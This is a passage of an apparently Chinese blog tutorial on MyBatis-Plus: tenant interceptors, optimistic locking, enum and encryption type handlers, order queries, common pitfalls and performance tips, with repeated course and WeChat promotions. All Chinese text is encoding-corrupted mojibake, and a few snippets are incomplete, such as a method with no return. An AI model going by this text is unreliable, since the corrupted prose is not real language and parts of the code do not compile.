                <span class="hljs-comment">// ä»å½“å‰ä¸Šä¸‹æ–‡ä¸­è·å–ç§Ÿæˆ·ID</span>
                <span class="hljs-type">String</span> <span class="hljs-variable">tenantId</span> <span class="hljs-operator">=</span> TenantContext.getCurrentTenantId();
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringValue</span>(tenantId);
            }
            
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getTenantIdColumn</span><span class="hljs-params">()</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-string">"tenant_id"</span>;  <span class="hljs-comment">// ç§Ÿæˆ·å­—æ®µå</span>
            }
            
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">ignoreTable</span><span class="hljs-params">(String tableName)</span> {
                <span class="hljs-comment">// å¿½ç•¥ä¸éœ€è¦ç§Ÿæˆ·éš”ç¦»çš„è¡¨</span>
                <span class="hljs-keyword">return</span> tableName.startsWith(<span class="hljs-string">"sys_"</span>);  <span class="hljs-comment">// ç³»ç»Ÿè¡¨ä¸éš”ç¦»</span>
            }
        });
        
        interceptor.addInnerInterceptor(tenantInterceptor);
        <span class="hljs-keyword">return</span> interceptor;
    }
}
</code></pre>
<h4 data-id="heading-16">4.2 ä¹è§‚é”ï¼ˆé˜²å¹¶å‘ä¿®æ”¹ï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å®ä½“ç±»æ·»åŠ ç‰ˆæœ¬å­—æ®µ</span>
<span class="hljs-meta">@Version</span>
<span class="hljs-keyword">private</span> Integer version;

<span class="hljs-comment">// æ›´æ–°æ—¶è‡ªåŠ¨å¸¦ç‰ˆæœ¬å·</span>
<span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userMapper.selectById(<span class="hljs-number">1L</span>);
user.setName(<span class="hljs-string">"æ–°åå­—"</span>);
userMapper.updateById(user);  <span class="hljs-comment">// è‡ªåŠ¨å¸¦ä¸Š version æ¡ä»¶</span>
<span class="hljs-comment">// SQL: UPDATE user SET name=?, version=? WHERE id=? AND version=?</span>
</code></pre>
<h4 data-id="heading-17">4.3 æšä¸¾ç±»å‹å¤„ç†</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å®šä¹‰æšä¸¾</span>
<span class="hljs-meta">@Getter</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">UserStatus</span> {
    ENABLED(<span class="hljs-number">1</span>, <span class="hljs-string">"å¯ç”¨"</span>),
    DISABLED(<span class="hljs-number">0</span>, <span class="hljs-string">"ç¦ç”¨"</span>),
    LOCKED(<span class="hljs-number">2</span>, <span class="hljs-string">"é”å®š"</span>);
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Integer code;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String desc;
    
    UserStatus(Integer code, String desc) {
        <span class="hljs-built_in">this</span>.code = code;
        <span class="hljs-built_in">this</span>.desc = desc;
    }
}

<span class="hljs-comment">// å®ä½“ç±»ä½¿ç”¨</span>
<span class="hljs-meta">@TableField(value = "status", typeHandler = EnumTypeHandler.class)</span>
<span class="hljs-keyword">private</span> UserStatus status;

<span class="hljs-comment">// æŸ¥è¯¢æ—¶ç›´æ¥ä½¿ç”¨æšä¸¾</span>
LambdaQueryWrapper&lt;User&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
wrapper.eq(User::getStatus, UserStatus.ENABLED);
</code></pre>
<h4 data-id="heading-18">4.4 å­—æ®µåŠ è§£å¯†</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è‡ªå®šä¹‰TypeHandler</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EncryptTypeHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTypeHandler</span>&lt;String&gt; {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Encryptor</span> <span class="hljs-variable">encryptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AESEncryptor</span>();
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNonNullParameter</span><span class="hljs-params">(PreparedStatement ps, <span class="hljs-type">int</span> i, String parameter, JdbcType jdbcType)</span> {
        <span class="hljs-comment">// å­˜æ•°æ®åº“æ—¶åŠ å¯†</span>
        ps.setString(i, encryptor.encrypt(parameter));
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getNullableResult</span><span class="hljs-params">(ResultSet rs, String columnName)</span> {
        <span class="hljs-comment">// å–æ•°æ®æ—¶è§£å¯†</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> rs.getString(columnName);
        <span class="hljs-keyword">return</span> value != <span class="hljs-literal">null</span> ? encryptor.decrypt(value) : <span class="hljs-literal">null</span>;
    }
}

<span class="hljs-comment">// å®ä½“ç±»ä½¿ç”¨</span>
<span class="hljs-meta">@TableField(value = "phone", typeHandler = EncryptTypeHandler.class)</span>
<span class="hljs-keyword">private</span> String phone;
</code></pre>
<h3 data-id="heading-19">äº”ã€å®æˆ˜ï¼šè®¢å•ç³»ç»ŸCRUD</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<h4 data-id="heading-20">5.1 ä¼ ç»Ÿå†™æ³• vs MyBatis-Pluså†™æ³•</h4>
<p><strong>ä¼ ç»Ÿå†™æ³•ï¼ˆ100+è¡Œä»£ç ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// OrderMapper.javaï¼ˆæ¥å£ï¼‰</span>
List&lt;Order&gt; <span class="hljs-title function_">findByCondition</span><span class="hljs-params">(OrderQuery query)</span>;
<span class="hljs-type">int</span> <span class="hljs-title function_">countByCondition</span><span class="hljs-params">(OrderQuery query)</span>;

<span class="hljs-comment">// OrderMapper.xmlï¼ˆXMLï¼Œ50+è¡Œï¼‰</span>
&lt;select id=<span class="hljs-string">"findByCondition"</span> resultType=<span class="hljs-string">"Order"</span>&gt;
    SELECT * FROM orders WHERE <span class="hljs-number">1</span>=<span class="hljs-number">1</span>
    &lt;<span class="hljs-keyword">if</span> test=<span class="hljs-string">"userId != null"</span>&gt;<span class="hljs-type">AND</span> <span class="hljs-variable">user_id</span> <span class="hljs-operator">=</span> #{userId}&lt;/<span class="hljs-keyword">if</span>&gt;
    &lt;<span class="hljs-keyword">if</span> test=<span class="hljs-string">"status != null"</span>&gt;<span class="hljs-type">AND</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> #{status}&lt;/<span class="hljs-keyword">if</span>&gt;
    &lt;<span class="hljs-keyword">if</span> test=<span class="hljs-string">"startTime != null"</span>&gt;AND create_time &gt;= #{startTime}&lt;/<span class="hljs-keyword">if</span>&gt;
    &lt;<span class="hljs-keyword">if</span> test=<span class="hljs-string">"endTime != null"</span>&gt;AND create_time &lt;= #{endTime}&lt;/<span class="hljs-keyword">if</span>&gt;
    ORDER BY create_time DESC
    LIMIT #{offset}, #{limit}
&lt;/select&gt;

&lt;select id=<span class="hljs-string">"countByCondition"</span> resultType=<span class="hljs-string">"int"</span>&gt;
    SELECT <span class="hljs-title function_">COUNT</span><span class="hljs-params">(*)</span> FROM orders WHERE <span class="hljs-number">1</span>=<span class="hljs-number">1</span>
    &lt;!-- é‡å¤ä¸€éæ¡ä»¶åˆ¤æ–­ --&gt;
&lt;/select&gt;

<span class="hljs-comment">// OrderService.javaï¼ˆä¸šåŠ¡é€»è¾‘ï¼Œ30+è¡Œï¼‰</span>
<span class="hljs-keyword">public</span> PageResult&lt;Order&gt; <span class="hljs-title function_">queryOrders</span><span class="hljs-params">(OrderQuery query)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> orderMapper.countByCondition(query);
    List&lt;Order&gt; list = orderMapper.findByCondition(query);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageResult</span>&lt;&gt;(total, list);
}
</code></pre>
<p><strong>MyBatis-Pluså†™æ³•ï¼ˆ20è¡Œä»£ç ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderMapper orderMapper;
    
    <span class="hljs-keyword">public</span> Page&lt;Order&gt; <span class="hljs-title function_">queryOrders</span><span class="hljs-params">(OrderQuery query)</span> {
        <span class="hljs-comment">// æ„é€ æŸ¥è¯¢æ¡ä»¶</span>
        LambdaQueryWrapper&lt;Order&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
        wrapper.eq(query.getUserId() != <span class="hljs-literal">null</span>, Order::getUserId, query.getUserId())
               .eq(query.getStatus() != <span class="hljs-literal">null</span>, Order::getStatus, query.getStatus())
               .ge(query.getStartTime() != <span class="hljs-literal">null</span>, Order::getCreateTime, query.getStartTime())
               .le(query.getEndTime() != <span class="hljs-literal">null</span>, Order::getCreateTime, query.getEndTime())
               .orderByDesc(Order::getCreateTime);
        
        <span class="hljs-comment">// åˆ†é¡µæŸ¥è¯¢ï¼ˆè‡ªåŠ¨ç»Ÿè®¡æ€»æ•°ï¼‰</span>
        Page&lt;Order&gt; page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(query.getPageNum(), query.getPageSize());
        <span class="hljs-keyword">return</span> orderMapper.selectPage(page, wrapper);
    }
    
    <span class="hljs-comment">// ç»Ÿè®¡å„çŠ¶æ€è®¢å•æ•°é‡</span>
    <span class="hljs-keyword">public</span> Map&lt;String, Long&gt; <span class="hljs-title function_">countByStatus</span><span class="hljs-params">()</span> {
        QueryWrapper&lt;Order&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();
        wrapper.select(<span class="hljs-string">"status, COUNT(*) as count"</span>)
               .groupBy(<span class="hljs-string">"status"</span>);
        
        List&lt;Map&lt;String, Object&gt;&gt; list = orderMapper.selectMaps(wrapper);
        <span class="hljs-comment">// è½¬æ¢ç»“æœ...</span>
    }
}
</code></pre>
<h4 data-id="heading-21">5.2 å¤æ‚æŸ¥è¯¢ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. è”è¡¨æŸ¥è¯¢</span>
<span class="hljs-keyword">public</span> List&lt;OrderVO&gt; <span class="hljs-title function_">getOrderWithUser</span><span class="hljs-params">(Long userId)</span> {
    QueryWrapper&lt;Order&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;&gt;();
    wrapper.select(<span class="hljs-string">"o.*, u.name as userName"</span>)
           .eq(<span class="hljs-string">"o.user_id"</span>, userId)
           .eq(<span class="hljs-string">"o.deleted"</span>, <span class="hljs-number">0</span>)
           .orderByDesc(<span class="hljs-string">"o.create_time"</span>);
    
    <span class="hljs-keyword">return</span> orderMapper.selectOrderWithUser(wrapper);
}

<span class="hljs-comment">// è‡ªå®šä¹‰Mapperæ–¹æ³•</span>
<span class="hljs-meta">@Select("SELECT o.*, u.name as userName FROM orders o " +
        "LEFT JOIN user u ON o.user_id = u.id " +
        "${ew.customSqlSegment}")</span>  <span class="hljs-comment">// ä½¿ç”¨Wrapperæ¡ä»¶</span>
List&lt;OrderVO&gt; <span class="hljs-title function_">selectOrderWithUser</span><span class="hljs-params">(<span class="hljs-meta">@Param(Constants.WRAPPER)</span> QueryWrapper&lt;Order&gt; wrapper)</span>;

<span class="hljs-comment">// 2. æ‰¹é‡æ“ä½œ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">batchUpdateStatus</span><span class="hljs-params">(List&lt;Long&gt; orderIds, Integer status)</span> {
    UpdateWrapper&lt;Order&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateWrapper</span>&lt;&gt;();
    wrapper.in(<span class="hljs-string">"id"</span>, orderIds)
           .set(<span class="hljs-string">"status"</span>, status)
           .set(<span class="hljs-string">"update_time"</span>, LocalDateTime.now());
    
    orderMapper.update(<span class="hljs-literal">null</span>, wrapper);  <span class="hljs-comment">// æ‰¹é‡æ›´æ–°</span>
}

<span class="hljs-comment">// 3. å­˜åœ¨åˆ™æ›´æ–°ï¼Œä¸å­˜åœ¨åˆ™æ’å…¥</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveOrUpdateOrder</span><span class="hljs-params">(Order order)</span> {
    <span class="hljs-comment">// è‡ªåŠ¨åˆ¤æ–­ï¼šæœ‰idåˆ™æ›´æ–°ï¼Œæ— idåˆ™æ’å…¥</span>
    orderMapper.insertOrUpdate(order);
}
</code></pre>
<h3 data-id="heading-22">å…­ã€é¿å‘æŒ‡å—</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<h4 data-id="heading-23">å‘1ï¼šå­—æ®µåä¸å¯¹åº”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šæ•°æ®åº“æ˜¯user_nameï¼Œå®ä½“æ˜¯userNameï¼Œä½†æ²¡é…ç½®æ˜ å°„</span>
<span class="hljs-keyword">private</span> String userName;

<span class="hljs-comment">// âœ… æ­£ç¡®1ï¼šä½¿ç”¨@TableFieldæŒ‡å®š</span>
<span class="hljs-meta">@TableField("user_name")</span>
<span class="hljs-keyword">private</span> String userName;

<span class="hljs-comment">// âœ… æ­£ç¡®2ï¼šé…ç½®å…¨å±€ä¸‹åˆ’çº¿è½¬é©¼å³°</span>
mybatis-plus:
  configuration:
    map-underscore-to-camel-<span class="hljs-keyword">case</span>: <span class="hljs-literal">true</span>
</code></pre>
<h4 data-id="heading-24">å‘2ï¼šåˆ†é¡µå¤±æ•ˆ</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šæ²¡é…ç½®åˆ†é¡µæ’ä»¶</span>
<span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">getUsers</span><span class="hljs-params">()</span> {
    Page&lt;User&gt; page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);
    <span class="hljs-keyword">return</span> userMapper.selectPage(page, <span class="hljs-literal">null</span>);  <span class="hljs-comment">// ä¸ä¼šåˆ†é¡µï¼</span>
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šé…ç½®åˆ†é¡µæ’ä»¶</span>
<span class="hljs-meta">@Bean</span>
<span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title function_">mybatisPlusInterceptor</span><span class="hljs-params">()</span> {
    <span class="hljs-type">MybatisPlusInterceptor</span> <span class="hljs-variable">interceptor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MybatisPlusInterceptor</span>();
    interceptor.addInnerInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PaginationInnerInterceptor</span>());
    <span class="hljs-keyword">return</span> interceptor;
}
</code></pre>
<h4 data-id="heading-25">å‘3ï¼šé€»è¾‘åˆ é™¤å­—æ®µç±»å‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šç”¨Stringç±»å‹ï¼Œä½†é…ç½®çš„æ˜¯Integer</span>
<span class="hljs-meta">@TableLogic</span>
<span class="hljs-keyword">private</span> String deleted;  <span class="hljs-comment">// é…ç½®æ˜¯1/0ï¼Œè¿™é‡Œæ˜¯String</span>

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šç±»å‹åŒ¹é…</span>
<span class="hljs-meta">@TableLogic</span>
<span class="hljs-keyword">private</span> Integer deleted;  <span class="hljs-comment">// ç”¨Integer</span>
<span class="hljs-comment">// æˆ–</span>
<span class="hljs-meta">@TableLogic</span>
<span class="hljs-keyword">private</span> Boolean deleted;  <span class="hljs-comment">// ç”¨Booleanï¼Œé…ç½®true/false</span>
</code></pre>
<h3 data-id="heading-26">ä¸ƒã€æ€§èƒ½ä¼˜åŒ–å»ºè®®</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<h4 data-id="heading-27">7.1 æŸ¥è¯¢ä¼˜åŒ–</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åªæŸ¥è¯¢éœ€è¦çš„å­—æ®µ</span>
LambdaQueryWrapper&lt;User&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>&lt;&gt;();
wrapper.select(User::getId, User::getName, User::getAge)  <span class="hljs-comment">// åªæŸ¥3ä¸ªå­—æ®µ</span>
       .eq(User::getStatus, <span class="hljs-number">1</span>);
</code></pre>
<h4 data-id="heading-28">7.2 æ‰¹é‡æ“ä½œ</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ‰¹é‡æ’å…¥ï¼ˆæ€§èƒ½æå‡10å€ï¼‰</span>
List&lt;User&gt; userList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
<span class="hljs-comment">// ...æ·»åŠ æ•°æ®</span>
userMapper.insertBatchSomeColumn(userList);  <span class="hljs-comment">// æ‰¹é‡æ’å…¥æ–¹æ³•</span>

<span class="hljs-comment">// æ‰¹é‡æ›´æ–°</span>
List&lt;Long&gt; ids = Arrays.asList(<span class="hljs-number">1L</span>, <span class="hljs-number">2L</span>, <span class="hljs-number">3L</span>);
UpdateWrapper&lt;User&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateWrapper</span>&lt;&gt;();
wrapper.in(<span class="hljs-string">"id"</span>, ids)
       .set(<span class="hljs-string">"status"</span>, <span class="hljs-number">2</span>);
userMapper.update(<span class="hljs-literal">null</span>, wrapper);
</code></pre>
<h4 data-id="heading-29">7.3 ç¼“å­˜ä½¿ç”¨</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Cacheable(value = "user", key = "#id")</span>
<span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(Long id)</span> {
    <span class="hljs-keyword">return</span> userMapper.selectById(id);
}

<span class="hljs-meta">@CacheEvict(value = "user", key = "#user.id")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateUser</span><span class="hljs-params">(User user)</span> {
    userMapper.updateById(user);
}
</code></pre>
<h3 data-id="heading-30">å…«ã€ä»Šæ—¥è¦ç‚¹æ€»ç»“</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<ol>
<li><strong>ä»£ç ç”Ÿæˆå™¨</strong>ï¼šæ–°é¡¹ç›®ã€æ–°è¡¨ä¸€é”®ç”Ÿæˆæ‰€æœ‰ä»£ç </li>
<li><strong>æ¡ä»¶æ„é€ å™¨</strong>ï¼šå‘Šåˆ«XMLï¼Œé“¾å¼è°ƒç”¨æ›´æ¸…æ™°</li>
<li><strong>åˆ†é¡µæ’ä»¶</strong>ï¼šä¸€è¡Œä»£ç æå®šåˆ†é¡µæŸ¥è¯¢</li>
<li><strong>è‡ªåŠ¨å¡«å……</strong>ï¼šåˆ›å»ºæ—¶é—´ã€æ›´æ–°æ—¶é—´è‡ªåŠ¨ç»´æŠ¤</li>
<li><strong>é€»è¾‘åˆ é™¤</strong>ï¼šæ•°æ®ä¸çœŸåˆ ï¼Œä¾¿äºæ¢å¤å’Œå®¡è®¡</li>
<li><strong>é«˜çº§åŠŸèƒ½</strong>ï¼šå¤šç§Ÿæˆ·ã€ä¹è§‚é”ã€æšä¸¾å¤„ç†</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šå­—æ®µé€‰æ‹©ã€æ‰¹é‡æ“ä½œã€ç¼“å­˜</li>
</ol>
<p><strong>å¯¹æ¯”ä¸€ä¸‹</strong>ï¼š</p>









































<table><thead><tr><th>åŠŸèƒ½</th><th>ä¼ ç»ŸMyBatis</th><th>MyBatis-Plus</th><th>æ•ˆç‡æå‡</th></tr></thead><tbody><tr><td>åŸºç¡€CRUD</td><td>å†™XMLï¼Œ4ä¸ªæ–¹æ³•</td><td>ç»§æ‰¿BaseMapperï¼Œ0è¡Œä»£ç </td><td>âˆ</td></tr><tr><td>æ¡ä»¶æŸ¥è¯¢</td><td>XMLé‡Œå†™ifæ ‡ç­¾</td><td>é“¾å¼è°ƒç”¨</td><td>3å€</td></tr><tr><td>åˆ†é¡µæŸ¥è¯¢</td><td>å†™2ä¸ªSQLï¼Œæ‰‹åŠ¨è®¡ç®—</td><td>selectPageä¸€è¡Œä»£ç </td><td>5å€</td></tr><tr><td>é€»è¾‘åˆ é™¤</td><td>æ¯ä¸ªæŸ¥è¯¢åŠ whereæ¡ä»¶</td><td>@TableLogicè‡ªåŠ¨è¿‡æ»¤</td><td>10å€</td></tr><tr><td>å­—æ®µå¡«å……</td><td>æ¯ä¸ªæ–¹æ³•é‡Œset</td><td>è‡ªåŠ¨å¡«å……å¤„ç†å™¨</td><td>8å€</td></tr></tbody></table>
<h3 data-id="heading-31">ä¹ã€æ€è€ƒé¢˜</h3>
<p><strong>åœºæ™¯</strong>ï¼šä½ è¦å¼€å‘ä¸€ä¸ªç”µå•†åå°ç®¡ç†ç³»ç»Ÿï¼Œæœ‰50å¼ è¡¨</p>
<ol>
<li>å¦‚ä½•å¿«é€Ÿå¼€å§‹å¼€å‘ï¼Ÿ</li>
<li>å¦‚ä½•å®ç°ç»Ÿä¸€çš„æ•°æ®æƒé™ï¼ˆä¸åŒäººçœ‹ä¸åŒæ•°æ®ï¼‰ï¼Ÿ</li>
<li>å¦‚ä½•ä¼˜åŒ–å¤§æ‰¹é‡æ•°æ®å¯¼å‡ºçš„æ€§èƒ½ï¼Ÿ</li>
<li>å¦‚ä½•å®ç°æ“ä½œæ—¥å¿—è‡ªåŠ¨è®°å½•ï¼Ÿ</li>
</ol>
<p>è¯„è®ºåŒºèŠèŠä½ çš„æ–¹æ¡ˆï¼Œæ˜å„¿å’±ä»¬è®²WebSocketã€‚</p>
<hr/>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<p><strong>æ˜å¤©é¢„å‘Š</strong>ï¼šã€ŠSpringBoot+WebSocketï¼šåœ¨çº¿èŠå¤©å®¤ä»0åˆ°1ã€‹</p>
<p><strong>ä»Šæ—¥ç¦åˆ©</strong>ï¼šå…³æ³¨åå›å¤"MPä»£ç ç”Ÿæˆ"ï¼Œè·å–å®Œæ•´ä»£ç ç”Ÿæˆå™¨é…ç½®å’Œæ¨¡æ¿æ–‡ä»¶ã€‚</p>
<hr/>
<h2 data-id="heading-32">è¿è¥å°è´´å£«ï¼š</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1RVyYBZE4z%2F%3Fvd_source%3Dd9789da0ed994ac777a822cd5ea4cf30" target="_blank" title="https://www.bilibili.com/video/BV1RVyYBZE4z/?vd_source=d9789da0ed994ac777a822cd5ea4cf30" ref="nofollow noopener noreferrer">é›¶åŸºç¡€å…¨æ ˆå¼€å‘Javaå¾®æœåŠ¡ç‰ˆæœ¬å®æˆ˜-åç«¯-å‰ç«¯-è¿ç»´-å®æˆ˜ä¼ä¸šçº§ä¸‰ä¸ªå®æˆ˜é¡¹ç›®</a></p>
<p><strong>èµ„æºè·å–</strong>ï¼šå…³æ³¨å…¬ä¼—å·: å°åè¯´Java ï¼Œè·å–æœ¬æ–‡æ‰€æœ‰ç¤ºä¾‹ä»£ç ã€é…ç½®æ¨¡æ¿åŠå¯¼å‡ºå·¥å…·ã€‚</p>
<p>ğŸ’¡ <strong>äº’åŠ¨</strong>ï¼š</p>
<ol>
